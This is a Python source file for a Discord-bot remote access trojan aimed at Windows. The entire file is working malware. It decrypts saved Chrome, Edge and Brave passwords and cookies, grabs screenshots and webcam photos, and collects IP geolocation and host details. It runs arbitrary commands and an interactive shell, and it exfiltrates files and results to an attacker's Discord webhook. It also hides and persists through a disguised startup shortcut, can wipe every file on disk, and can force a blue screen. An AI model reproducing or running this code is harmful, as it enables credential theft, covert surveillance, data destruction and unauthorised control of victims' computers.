import discord
import subprocess
import os
import threading
import time
import shutil
import ctypes
import sys
import socket
import platform
import getpass
import requests
import uuid
import asyncio
import random
import string
from discord.ext import commands
from dotenv import load_dotenv
import sqlite3
import base64
import json
from Crypto.Cipher import AES
import win32crypt
from PIL import ImageGrab
import cv2

load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

if TOKEN is None:
    print("ERROR: DISCORD_TOKEN not found in .env file")
    sys.exit(1)

if WEBHOOK_URL is None:
    print("ERROR: WEBHOOK_URL not found in .env file")
    sys.exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

shell_process = None
shell_thread = None

# Hidden state
is_hidden = False
original_filename = None
hidden_paths = {}

def get_username():
    """Get the current Windows username"""
    try:
        return os.environ.get('USERNAME') or os.environ.get('USER') or getpass.getuser()
    except:
        return "user"

def get_desktop_name():
    """Get the current user's desktop name/folder path"""
    try:
        desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
        if os.path.exists(desktop):
            return desktop
        desktop = os.path.join(os.environ['HOMEDRIVE'], os.environ['HOMEPATH'], 'Desktop')
        if os.path.exists(desktop):
            return desktop
        return os.path.expanduser('~/Desktop')
    except:
        return os.path.expanduser('~/Desktop')

def get_desktop_folder_name():
    """Get just the folder name of the desktop"""
    try:
        desktop_path = get_desktop_name()
        return os.path.basename(desktop_path)
    except:
        return "Desktop"

def get_hide_name():
    """Generate hide name using the actual Windows username"""
    try:
        username = get_username()
        clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
        return f"{clean_username}_helper.exe"
    except:
        return "scvhost.exe"

def add_to_startup(file_path, username=None):
    """Add program to Windows startup using username in the shortcut"""
    try:
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                       r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        if username is None:
            username = get_username()
        clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
        shortcut_name = f"{clean_username}_helper.lnk"
        shortcut_path = os.path.join(startup_folder, shortcut_name)
        
        ps_script = f'''
        $WshShell = New-Object -comObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
        $Shortcut.TargetPath = "{file_path}"
        $Shortcut.WorkingDirectory = "{os.path.dirname(file_path)}"
        $Shortcut.WindowStyle = 7
        $Shortcut.Description = "System Helper"
        $Shortcut.Save()
        '''
        subprocess.run(['powershell', '-command', ps_script], shell=True, capture_output=True)
        return shortcut_path
    except:
        return None

def remove_from_startup():
    """Remove program from Windows startup"""
    try:
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                       r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        username = get_username()
        clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
        
        for item in os.listdir(startup_folder):
            if item.lower().startswith(clean_username.lower()) and item.endswith('.lnk'):
                try:
                    os.remove(os.path.join(startup_folder, item))
                    return True
                except:
                    pass
        
        for item in os.listdir(startup_folder):
            if item.lower() == "scvhost.lnk":
                try:
                    os.remove(os.path.join(startup_folder, item))
                    return True
                except:
                    pass
        return True
    except:
        return False

def hide_file(file_path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
        return True
    except:
        return False

def unhide_file(file_path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 128)
        return True
    except:
        return False

def get_current_script_path():
    return os.path.abspath(sys.argv[0])

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json().get('ip', 'Unknown')
    except:
        try:
            response = requests.get('https://httpbin.org/ip', timeout=5)
            return response.json().get('origin', 'Unknown')
        except:
            return "Failed to get IP"

def get_ip_geolocation(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            return {
                'ip': ip,
                'city': data.get('city', 'Unknown'),
                'region': data.get('regionName', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'zip': data.get('zip', 'Unknown'),
                'lat': data.get('lat', 'Unknown'),
                'lon': data.get('lon', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'org': data.get('org', 'Unknown')
            }
        return {'ip': ip, 'error': 'Geolocation failed'}
    except:
        return {'ip': ip, 'error': 'Request failed'}

def run_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if output == "":
            output = "Command executed with no output"
        return output
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return str(e)

def delete_all_files():
    try:
        root = os.path.abspath(os.sep)
        for dirpath, dirnames, filenames in os.walk(root):
            for filename in filenames:
                try:
                    os.remove(os.path.join(dirpath, filename))
                except:
                    pass
            for dirname in dirnames:
                try:
                    shutil.rmtree(os.path.join(dirpath, dirname))
                except:
                    pass
        return "Attempted deletion of all files completed."
    except Exception as e:
        return f"Deletion failed: {str(e)}"

def blue_screen():
    try:
        if sys.platform == 'win32':
            ntdll = ctypes.windll.ntdll
            ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        else:
            return "BSOD only works on Windows"
        return "BSOD triggered"
    except Exception as e:
        return f"BSOD failed: {str(e)}"

def take_screenshot():
    try:
        timestamp = int(time.time())
        screenshot_path = f"screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        
        from discord import SyncWebhook, File
        webhook = SyncWebhook.from_url(WEBHOOK_URL)
        with open(screenshot_path, 'rb') as f:
            webhook.send(file=File(f, screenshot_path))
        os.remove(screenshot_path)
        return "Screenshot captured and sent"
    except Exception as e:
        return f"Screenshot failed: {str(e)}"

def webcam_capture():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "Webcam not accessible or not found"
        
        ret, frame = cap.read()
        if ret:
            timestamp = int(time.time())
            webcam_path = f"webcam_{timestamp}.jpg"
            cv2.imwrite(webcam_path, frame)
            
            from discord import SyncWebhook, File
            webhook = SyncWebhook.from_url(WEBHOOK_URL)
            with open(webcam_path, 'rb') as f:
                webhook.send(file=File(f, webcam_path))
            os.remove(webcam_path)
            cap.release()
            return "Webcam photo captured and sent"
        cap.release()
        return "Failed to capture webcam frame"
    except Exception as e:
        return f"Webcam capture failed: {str(e)}"

def get_browser_cookies():
    cookie_data = []
    browser_paths = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
        "Chrome_Alt": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies",
        "Edge_Alt": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
    }
    
    for browser, cookie_path in browser_paths.items():
        if os.path.exists(cookie_path):
            try:
                temp_cookie = os.path.join(os.environ["TEMP"], f"cookies_{int(time.time())}.db")
                shutil.copy2(cookie_path, temp_cookie)
                conn = sqlite3.connect(temp_cookie)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 100")
                
                for row in cursor.fetchall():
                    host = row[0]
                    name = row[1]
                    encrypted = row[2]
                    try:
                        decrypted = win32crypt.CryptUnprotectData(encrypted)[1].decode('utf-8', errors='ignore')
                        cookie_data.append(f"[{browser}] {host} | {name} = {decrypted[:200]}")
                    except:
                        cookie_data.append(f"[{browser}] {host} | {name} = [ENCRYPTED]")
                conn.close()
                os.remove(temp_cookie)
            except:
                pass
    
    if cookie_data:
        return "\n".join(cookie_data[:200])
    return "No cookies found or unable to extract"

def download_all_cookies():
    try:
        cookie_text = get_browser_cookies()
        timestamp = int(time.time())
        cookie_file = f"cookies_{timestamp}.txt"
        
        with open(cookie_file, 'w', encoding='utf-8') as f:
            f.write(cookie_text)
        
        from discord import SyncWebhook, File
        webhook = SyncWebhook.from_url(WEBHOOK_URL)
        with open(cookie_file, 'rb') as f:
            webhook.send(file=File(f, cookie_file))
        os.remove(cookie_file)
        return f"Cookies extracted and sent. Total: {len(cookie_text)} characters"
    except Exception as e:
        return f"Cookie extraction failed: {str(e)}"

def get_browser_passwords():
    all_passwords = []
    
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    }
    
    for browser_name, login_path in browsers.items():
        if os.path.exists(login_path):
            try:
                temp_db = os.path.join(os.environ["TEMP"], f"logins_{int(time.time())}.db")
                shutil.copy2(login_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                
                for row in rows:
                    url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    
                    if username and encrypted_password:
                        password = None
                        try:
                            password = win32crypt.CryptUnprotectData(encrypted_password)[1].decode('utf-8')
                        except:
                            try:
                                local_state_path = os.path.join(os.path.dirname(os.path.dirname(login_path)), "Local State")
                                if os.path.exists(local_state_path):
                                    with open(local_state_path, 'r', encoding='utf-8') as f:
                                        local_state = json.load(f)
                                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                                    encrypted_key = encrypted_key[5:]
                                    secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                                    
                                    nonce = encrypted_password[3:15]
                                    ciphertext = encrypted_password[15:-16]
                                    tag = encrypted_password[-16:]
                                    cipher = AES.new(secret_key, AES.MODE_GCM, nonce=nonce)
                                    password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
                            except:
                                password = "[DECRYPTION_FAILED]"
                        
                        if not password:
                            password = "[DECRYPTION_FAILED]"
                        
                        all_passwords.append(f"[{browser_name}]\nURL: {url}\nUsername: {username}\nPassword: {password}\n{'-'*40}")
                
                conn.close()
                os.remove(temp_db)
            except Exception as e:
                print(f"Error reading {browser_name}: {e}")
    
    return all_passwords

def interactive_shell():
    global shell_process, shell_thread
    if shell_process and shell_process.poll() is None:
        return "Shell already active. Use !shell_input <command>"
    shell_process = subprocess.Popen(
        ['cmd.exe'] if sys.platform == 'win32' else ['/bin/sh'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    def read_output():
        while shell_process and shell_process.poll() is None:
            try:
                output = shell_process.stdout.readline()
                if output:
                    from discord import SyncWebhook
                    webhook = SyncWebhook.from_url(WEBHOOK_URL)
                    for chunk in [output[i:i+1900] for i in range(0, len(output), 1900)]:
                        webhook.send(f"Shell output: {chunk}")
            except:
                break
    shell_thread = threading.Thread(target=read_output, daemon=True)
    shell_thread.start()
    return "Interactive shell opened. Use !shell_input <command>"

def shell_input(cmd):
    global shell_process
    if not shell_process or shell_process.poll() is not None:
        return "No active shell. Use !shell_start first."
    try:
        shell_process.stdin.write(cmd + '\n')
        shell_process.stdin.flush()
        return f"Command sent: {cmd}"
    except Exception as e:
        return f"Shell input failed: {str(e)}"

async def send_webhook(content):
    try:
        from discord import SyncWebhook
        webhook = SyncWebhook.from_url(WEBHOOK_URL)
        for chunk in [content[i:i+1900] for i in range(0, len(content), 1900)]:
            webhook.send(chunk)
    except Exception as e:
        print(f"Webhook send failed: {e}")

def delete_file(path):
    try:
        if os.path.isfile(path):
            os.remove(path)
            return f"Deleted file: {path}"
        elif os.path.isdir(path):
            shutil.rmtree(path)
            return f"Deleted directory: {path}"
        else:
            return f"Path not found: {path}"
    except Exception as e:
        return f"Delete failed: {str(e)}"

def list_directory(path='.'):
    try:
        path = os.path.expanduser(path)
        if not os.path.exists(path):
            return f"Path not found: {path}"
        items = os.listdir(path)
        return "\n".join(items[:100])
    except PermissionError:
        return f"Permission denied: {path}"
    except Exception as e:
        return str(e)

def install_package(package_name):
    try:
        result = subprocess.run(
            f'pip install {package_name}',
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        if result.returncode == 0:
            return f"Installed {package_name} using pip"
        
        result = subprocess.run(
            f'winget install {package_name} --silent',
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        if result.returncode == 0:
            return f"Installed {package_name} using winget"
        
        return f"Failed to install {package_name}"
    except Exception as e:
        return f"Installation error: {str(e)}"

@bot.event
async def on_ready():
    pass

@bot.command()
async def hide(ctx):
    global is_hidden, original_filename, hidden_paths
    
    await ctx.send("Hiding bot...")
    
    try:
        script_path = get_current_script_path()
        script_dir = os.path.dirname(script_path)
        original_filename = os.path.basename(script_path)
        
        username = get_username()
        clean_username = ''.join(c for c in username if c.isalnum() or c in ['_', '-'])
        hide_name = f"{clean_username}_helper.exe"
        
        new_path = os.path.join(script_dir, hide_name)
        
        if os.path.exists(new_path) and new_path != script_path:
            try:
                os.remove(new_path)
            except:
                pass
        
        os.rename(script_path, new_path)
        hidden_paths['new_path'] = new_path
        hidden_paths['hide_name'] = hide_name
        
        hide_file(new_path)
        hidden_paths['hidden'] = True
        
        startup_path = add_to_startup(new_path, username)
        if startup_path:
            hidden_paths['startup'] = startup_path
            hide_file(startup_path)
        
        is_hidden = True
        
        await send_webhook(f"**BOT HIDDEN**\nRenamed to: {hide_name}\nUsername: {username}\nStartup added: Yes")
        await ctx.send(f"Bot hidden successfully! Renamed to: {hide_name}")
        
    except Exception as e:
        await ctx.send(f"Hide failed: {str(e)}")
        await send_webhook(f"Hide failed: {str(e)}")

@bot.command()
async def unhide(ctx):
    global is_hidden, original_filename, hidden_paths
    
    await ctx.send("Unhiding bot...")
    
    try:
        script_path = get_current_script_path()
        script_dir = os.path.dirname(script_path)
        
        remove_from_startup()
        unhide_file(script_path)
        
        if original_filename and 'new_path' in hidden_paths:
            original_path = os.path.join(script_dir, original_filename)
            
            if os.path.exists(original_path) and os.path.isfile(original_path):
                try:
                    os.remove(original_path)
                except:
                    pass
            
            if script_path != original_path:
                os.rename(script_path, original_path)
                hidden_paths['restored_path'] = original_path
        
        is_hidden = False
        hidden_paths = {}
        
        await send_webhook("**BOT UNHIDDEN**\nStartup removed\nFile unhidden")
        await ctx.send("Bot unhidden successfully!")
        
    except Exception as e:
        await ctx.send(f"Unhide failed: {str(e)}")
        await send_webhook(f"Unhide failed: {str(e)}")

@bot.command()
async def status(ctx):
    """Show detailed bot status including all directories and locations"""
    try:
        script_path = get_current_script_path()
        script_dir = os.path.dirname(script_path)
        script_name = os.path.basename(script_path)
        username = get_username()
        desktop_path = get_desktop_name()
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                       r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        status_msg = f"""
BOT STATUS REPORT
====================
Bot Name: {script_name}
Bot Location: {script_path}
Bot Directory: {script_dir}

USER INFORMATION
Username: {username}
Desktop Path: {desktop_path}
AppData Path: {os.environ.get('APPDATA', 'Unknown')}
Temp Path: {os.environ.get('TEMP', 'Unknown')}

HIDDEN STATUS
Hidden: {is_hidden}
Hidden Name: {hidden_paths.get('hide_name', 'None') if is_hidden else 'Not hidden'}
New Path: {hidden_paths.get('new_path', 'None') if is_hidden else 'Not hidden'}

STARTUP LOCATIONS
Startup Folder: {startup_folder}

STARTUP SHORTCUTS
"""
        # Check startup folder contents
        try:
            if os.path.exists(startup_folder):
                startup_items = os.listdir(startup_folder)
                if startup_items:
                    status_msg += "Found shortcuts:\n"
                    for item in startup_items:
                        if item.endswith('.lnk'):
                            status_msg += f"  - {item}\n"
                else:
                    status_msg += "No shortcuts found in startup folder\n"
            else:
                status_msg += "Startup folder not found\n"
        except:
            status_msg += "Unable to read startup folder\n"
        
        # Check if current file is hidden
        try:
            is_file_hidden = ctypes.windll.kernel32.GetFileAttributesW(script_path) & 2 != 0 if os.path.exists(script_path) else False
            status_msg += f"\nFILE ATTRIBUTES\nCurrent file hidden: {is_file_hidden}\n"
        except:
            status_msg += "\nFILE ATTRIBUTES\nCurrent file hidden: Unable to check\n"
        
        status_msg += f"""
SYSTEM INFO
Platform: {platform.system()} {platform.release()}
Architecture: {platform.machine()}
Python Version: {platform.python_version()}
        """
        
        await ctx.send(f"```\n{status_msg}\n```")
        await send_webhook(f"**STATUS REPORT**\n```\n{status_msg}\n```")
        
    except Exception as e:
        await ctx.send(f"Status check failed: {str(e)}")
        await send_webhook(f"Status error: {str(e)}")

@bot.command()
async def install(ctx, *, package):
    await ctx.send(f"Installing: {package}")
    
    def install_thread():
        result = install_package(package)
        asyncio.run_coroutine_threadsafe(
            send_webhook(f"Install result for {package}: {result}"),
            bot.loop
        )
        asyncio.run_coroutine_threadsafe(
            ctx.send(result),
            bot.loop
        )
    
    thread = threading.Thread(target=install_thread, daemon=True)
    thread.start()

@bot.command()
async def ip(ctx):
    ip = get_public_ip()
    geo = get_ip_geolocation(ip)
    
    if 'error' in geo:
        output = f"IP Address: {ip}\nError: {geo['error']}"
    else:
        output = f"IP Address: {geo['ip']}\nCity: {geo['city']}\nRegion: {geo['region']}\nCountry: {geo['country']}\nZIP: {geo['zip']}\nCoordinates: {geo['lat']}, {geo['lon']}\nISP: {geo['isp']}\nOrganization: {geo['org']}"
    
    await send_webhook(f"**VICTIM IP INFORMATION**\n```\n{output}\n```")
    await ctx.send("IP information sent to webhook.")

@bot.command()
async def pcinfo(ctx):
    await ctx.send("Collecting PC information...")
    
    try:
        hostname = socket.gethostname()
        username = getpass.getuser()
        ip = get_public_ip()
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor = platform.processor()
        desktop_path = get_desktop_name()
        
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
        
        win_ver = ""
        if platform.system() == "Windows":
            win_ver = f"Windows Version: {platform.win32_ver()[0]} {platform.win32_ver()[1]}"
        
        output = f"Hostname: {hostname}\nUsername: {username}\nIP Address: {ip}\nOS: {system} {release}\n{win_ver}\nOS Version: {version}\nArchitecture: {machine}\nProcessor: {processor}\nMAC Address: {mac}\nDesktop Path: {desktop_path}"
        
        await send_webhook(f"**PC INFORMATION**\n```\n{output}\n```")
        await ctx.send("PC information sent to webhook.")
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def passwords(ctx):
    await ctx.send("Extracting saved passwords...")
    
    all_passwords = get_browser_passwords()
    
    if all_passwords:
        password_text = "**=== STOLEN PASSWORDS ===**\n```\n" + "\n".join(all_passwords) + "\n```"
        
        if len(password_text) > 1900:
            chunks = [password_text[i:i+1900] for i in range(0, len(password_text), 1900)]
            for chunk in chunks:
                await send_webhook(chunk)
        else:
            await send_webhook(password_text)
        
        await ctx.send(f"Extracted {len(all_passwords)} passwords and sent to webhook")
    else:
        await ctx.send("No passwords found or unable to extract")

@bot.command()
async def cmd(ctx, *, command):
    output = run_command(command)
    await send_webhook(f"Command: {command}\nOutput:\n{output[:1900]}")
    await ctx.send(f"Command sent. Check webhook for output.")

@bot.command()
async def screenshot(ctx):
    output = take_screenshot()
    await send_webhook(output)
    await ctx.send("Screenshot captured and sent to webhook.")

@bot.command()
async def webcam(ctx):
    output = webcam_capture()
    await send_webhook(output)
    await ctx.send("Webcam photo captured and sent to webhook.")

@bot.command()
async def cookies(ctx):
    output = download_all_cookies()
    await send_webhook(output)
    await ctx.send("Cookies extracted and sent to webhook.")

@bot.command()
async def shell_start(ctx):
    output = interactive_shell()
    await send_webhook(output)
    await ctx.send("Shell started.")

@bot.command()
async def shell_input(ctx, *, command):
    output = shell_input(command)
    await send_webhook(output)
    await ctx.send("Command sent.")

@bot.command()
async def ls(ctx, path='.'):
    try:
        path = os.path.expanduser(path)
        if not os.path.exists(path):
            await ctx.send(f"Path not found: {path}")
            return
        
        items = os.listdir(path)
        output = "\n".join(items[:100])
        await send_webhook(f"Listing {path}:\n{output[:1900]}")
        await ctx.send(f"Directory listing sent to webhook")
    except PermissionError:
        await ctx.send(f"Permission denied: {path}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def download(ctx, *, file_path):
    await ctx.send(f"Attempting to download: {file_path}")
    
    def download_thread():
        try:
            file_path_clean = file_path.strip('"').strip("'")
            file_path_clean = os.path.expanduser(file_path_clean)
            
            if os.path.exists(file_path_clean) and not os.path.isdir(file_path_clean):
                found_path = file_path_clean
            else:
                possible_paths = [
                    file_path_clean,
                    file_path_clean.replace('/', '\\'),
                    file_path_clean.replace('\\', '/'),
                    os.path.join(os.environ.get('USERPROFILE', ''), file_path_clean),
                    os.path.join(os.environ.get('SYSTEMDRIVE', 'C:'), file_path_clean)
                ]
                
                found_path = None
                for path in possible_paths:
                    if os.path.exists(path) and not os.path.isdir(path):
                        found_path = path
                        break
            
            if not found_path:
                asyncio.run_coroutine_threadsafe(
                    ctx.send(f"File not found: {file_path_clean}"),
                    bot.loop
                )
                return
            
            file_size = os.path.getsize(found_path)
            if file_size > 25 * 1024 * 1024:
                asyncio.run_coroutine_threadsafe(
                    ctx.send(f"File too large: {file_size / (1024*1024):.1f}MB (Discord limit is 25MB)"),
                    bot.loop
                )
                return
            
            asyncio.run_coroutine_threadsafe(
                ctx.send(f"Sending file: {os.path.basename(found_path)} ({file_size / 1024:.1f}KB)"),
                bot.loop
            )
            
            with open(found_path, 'rb') as f:
                from discord import SyncWebhook, File
                webhook = SyncWebhook.from_url(WEBHOOK_URL)
                webhook.send(file=File(f, os.path.basename(found_path)))
            
            asyncio.run_coroutine_threadsafe(
                send_webhook(f"File downloaded: {found_path}"),
                bot.loop
            )
            asyncio.run_coroutine_threadsafe(
                ctx.send(f"File sent to webhook: {os.path.basename(found_path)}"),
                bot.loop
            )
            
        except PermissionError:
            asyncio.run_coroutine_threadsafe(
                ctx.send(f"Permission denied: {file_path}"),
                bot.loop
            )
            asyncio.run_coroutine_threadsafe(
                send_webhook(f"Download failed: Permission denied for {file_path}"),
                bot.loop
            )
        except Exception as e:
            asyncio.run_coroutine_threadsafe(
                ctx.send(f"Download failed: {str(e)}"),
                bot.loop
            )
            asyncio.run_coroutine_threadsafe(
                send_webhook(f"Download error: {str(e)}"),
                bot.loop
            )
    
    thread = threading.Thread(target=download_thread, daemon=True)
    thread.start()

@bot.command()
async def delete(ctx, *, path):
    output = delete_file(path)
    await send_webhook(output)
    await ctx.send("Command sent.")

@bot.command()
async def delall(ctx):
    output = delete_all_files()
    await send_webhook(output)
    await ctx.send("Command sent.")

@bot.command()
async def bsod(ctx):
    output = blue_screen()
    await send_webhook(output)
    await ctx.send("Command sent.")

@bot.command()
async def webhook_test(ctx):
    await send_webhook("Webhook is working!")
    await ctx.send("Test sent.")

if __name__ == '__main__':
    import sys
    import io
    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()
    
    bot.run(TOKEN)
